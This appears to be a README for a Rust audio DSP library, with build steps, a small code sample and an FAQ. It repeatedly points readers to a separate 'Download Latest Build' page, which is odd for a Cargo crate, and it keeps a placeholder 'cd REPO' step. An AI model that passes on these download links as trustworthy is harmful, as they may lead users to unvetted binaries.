# Auxide DSP v0.2.0 - Audio DSP library 2026

> **Auxide DSP v0.2.0 is a Rust library for constructing real-time audio graphs from reusable nodes for synthesis, filtering, modulation, effects, and dynamics processing.**

[![Platform](https://img.shields.io/badge/Platform-Rust-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v0.2.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/hilltylerzzu842/auxide-realtime-dsp?style=flat-square)](https://github.com/hilltylerzzu842/auxide-realtime-dsp)

---

<p align="center">
  <a href="https://hilltylerzzu842.github.io/auxide-realtime-dsp/">
    <img src="https://img.shields.io/badge/Download-Auxide%20DSP%20Latest-brightgreen?style=for-the-badge" alt="Download Auxide DSP">
  </a>
</p>

> **[Download Auxide DSP v0.2.0](https://hilltylerzzu842.github.io/auxide-realtime-dsp/)**

---

[Download Latest Build](https://hilltylerzzu842.github.io/auxide-realtime-dsp/)

---

## Overview

Auxide DSP is a set of composable DSP nodes for audio software written in Rust. Its building blocks can be arranged into audio graphs covering synthesis, signal shaping, modulation, filtering, effects, and additional processing stages.

Nodes are organized around traits to encourage structured graph construction and processing suitable for real-time use. Oscillators, wavetable sources, envelopes, LFOs, dynamics processors, and pitch or time tools can be connected to create instruments, sound engines, and other live audio systems.

---

## Highlights

- Trait-oriented DSP nodes for building reusable processing graphs
- Processing structures designed with real-time use in mind
- Oscillator and wavetable components for generating sound
- Filtering, effects, and dynamics-processing nodes
- Envelopes, LFOs, and additional modulation sources
- Components for pitch and time manipulation
- Window generators for shaping signals
- `SynthBuilder` and `EffectsChainBuilder` for creating common graph arrangements

---

## Getting Started

Check out the source repository and enter its directory:

```bash
git clone https://github.com/hilltylerzzu842/auxide-realtime-dsp.git
cd REPO
```

Use Cargo to compile the library and execute the available tests:

```bash
cargo build
cargo test
```

For use as a dependency in a separate Rust application, add version 0.2.0 to `Cargo.toml`:

```toml
[dependencies]
auxide-dsp = "0.2.0"
```

Your application can then import the nodes and builders needed for its audio graph and incorporate them into its processing path.

---

## Building an Audio Graph

An Auxide DSP setup commonly follows this sequence:

1. Choose source nodes, including oscillators or wavetable generators.
2. Introduce envelopes, LFOs, and other modulation sources.
3. Pass the resulting signals through filters, effects, or dynamics processors.
4. Add pitch or time processing when the application requires it.
5. Arrange the nodes with the available builder types.
6. Run the graph from the host application's real-time callback or rendering loop.

For example, a project may begin with a synthesis structure and attach an effects structure for later processing:

```rust
use auxide_dsp::{EffectsChainBuilder, SynthBuilder};

fn build_audio_graph() {
    let synth = SynthBuilder::new();
    let effects = EffectsChainBuilder::new();

    // Configure the graph for the host application's audio workflow.
    let _ = (synth, effects);
}
```

The appropriate nodes and routing depend on the host application's sample format, channel arrangement, audio runtime, and overall signal flow.

---

## Configuration

Configuration is performed in Rust code. Auxide DSP does not define a separate application settings file, so the host project generally owns graph creation, node parameters, modulation connections, and processing choices.

A host application might keep core audio values in a structure such as:

```rust
struct AudioConfig {
    sample_rate: f32,
    channels: usize,
    block_size: usize,
}
```

When setting up and processing the graph, use the values supplied by the host audio engine so the DSP configuration remains aligned with the active runtime.

---

## Requirements

- Rust and its Cargo build tool
- A Rust application that can host real-time audio processing
- An audio backend or runtime provided by the host application
- Enough CPU resources for the chosen nodes, effects, and graph complexity
- Disk space for the cloned source tree and Cargo build output

---

## Frequently Asked Questions

### What kinds of projects use Auxide DSP?

Auxide DSP is intended for Rust audio applications requiring components for synthesis, filtering, modulation, effects, envelopes, dynamics, and related signal-processing operations.

### Is an audio backend included?

No audio backend is specified by the library itself. Auxide DSP supplies DSP building blocks, while the host application connects them to its selected backend or processing environment.

### How can I move to a newer release?

Change the dependency version in `Cargo.toml` when using the package, or pull updated repository contents for a local checkout. Before applying a version change in a production audio system, review the project's release information.

### Where should application settings live?

This project does not define a separate settings location. The Rust application using Auxide DSP normally stores node values and graph configuration.

### What steps help diagnose a failed build?

Make sure Rust and Cargo are available, check that the dependency version is correct, run `cargo test`, and use the compiler output to identify the affected node or API.

### Do I need to use every available node?

No. A project can include only the DSP components required by its graph instead of using all available oscillators, filters, effects, and modulation sources.

---

## Roadmap

Development progress and future work can be followed through the repository. As the project evolves, possible areas of continued work include expanding the DSP node collection, improving graph-construction workflows, and extending real-time audio processing capabilities.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
